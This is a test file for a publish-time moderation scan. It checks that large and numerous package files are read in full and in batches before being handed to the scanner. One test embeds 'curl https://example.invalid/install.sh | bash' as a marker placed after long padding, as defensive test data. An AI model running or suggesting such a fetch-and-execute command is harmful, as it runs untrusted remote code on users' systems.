import { beforeEach, describe, expect, it, vi } from "vitest";
import { runStaticModerationScan } from "./moderationEngine";
import { runStaticPublishScan } from "./staticPublishScan";

vi.mock("./moderationEngine", () => ({
  runStaticModerationScan: vi.fn(() => ({
    status: "clean",
    reasonCodes: [],
    findings: [],
    summary: "clean",
    engineVersion: "test",
    checkedAt: 1,
  })),
}));

describe("runStaticPublishScan", () => {
  beforeEach(() => {
    vi.mocked(runStaticModerationScan).mockClear();
  });

  it("scans complete large UTF-8 artifacts", async () => {
    const marker = "curl https://example.invalid/install.sh | bash\n";
    const blob = new Blob(["a".repeat(300 * 1024), marker], { type: "text/plain" });

    await runStaticPublishScan(
      {
        storage: {
          get: vi.fn(async () => blob),
        },
      } as never,
      {
        slug: "large-script",
        displayName: "Large Script",
        files: [
          {
            path: "scripts/install.sh",
            size: blob.size,
            storageId: "storage:large",
            contentType: "text/plain",
          },
        ],
      },
    );

    expect(runStaticModerationScan).toHaveBeenCalledWith(
      expect.objectContaining({
        fileContents: [
          {
            path: "scripts/install.sh",
            content: expect.stringContaining(marker.trim()),
          },
        ],
      }),
    );
  });

  it("does not stop after 200 valid UTF-8 files", async () => {
    const files = Array.from({ length: 201 }, (_, index) => ({
      path: `file-${String(index).padStart(3, "0")}.txt`,
      size: 1,
      storageId: `storage:${index}`,
      contentType: "text/plain",
    }));

    await runStaticPublishScan(
      {
        storage: {
          get: vi.fn(async (storageId: string) => new Blob([storageId])),
        },
      } as never,
      {
        slug: "many-files",
        displayName: "Many Files",
        files,
      },
    );

    const input = vi.mocked(runStaticModerationScan).mock.calls[0]?.[0];
    expect(input?.fileContents).toHaveLength(201);
    expect(input?.fileContents.at(-1)).toEqual({
      path: "file-200.txt",
      content: "storage:200",
    });
  });
  it("reads storage in overlapping batches and keeps file order for the scan", async () => {
    const files = Array.from({ length: 70 }, (_, index) => ({
      path: `src/file-${index}.ts`,
      size: 20,
      storageId: `storage:${index}`,
    }));
    let inFlight = 0;
    let maxInFlight = 0;
    const storageGet = vi.fn(async (storageId: string) => {
      inFlight += 1;
      maxInFlight = Math.max(maxInFlight, inFlight);
      await new Promise((resolve) => setTimeout(resolve, 2));
      inFlight -= 1;
      return new Blob([new TextEncoder().encode(`export const id = "${storageId}";\n`)]);
    });

    const result = await runStaticPublishScan({ storage: { get: storageGet } } as never, {
      slug: "batched-plugin",
      displayName: "Batched Plugin",
      files,
    });

    expect(storageGet).toHaveBeenCalledTimes(70);
    expect(maxInFlight).toBeGreaterThan(1);
    expect(maxInFlight).toBeLessThanOrEqual(32);
    expect(storageGet.mock.calls.map(([id]) => id)).toEqual(files.map((file) => file.storageId));
    expect(result.status).toBe("clean");
  });
});
